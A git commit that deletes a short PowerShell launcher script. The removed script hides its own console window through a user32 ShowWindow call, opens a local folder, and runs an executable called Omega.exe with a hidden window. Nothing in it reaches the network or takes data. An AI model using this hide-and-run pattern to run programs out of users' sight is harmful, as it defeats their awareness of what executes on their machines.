b233612a3a1fbff0cee7a33194601d334938084a
Lorenzo Vittone <94842063+Zeonvoltron@users.noreply.github.com>
2022-01-05 19:51:32 -0300

    Delete Delta.ps1

--- Delta.ps1
+++
@@ -1,8 +0,0 @@
-﻿$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'                  #This is for making the console close almost the moment its opened
-add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
-
-
-Invoke-Item "SafeFiles\"
-start-process -filepath '.\Omega\Omega.exe' -Wait -WindowStyle Hidden
-
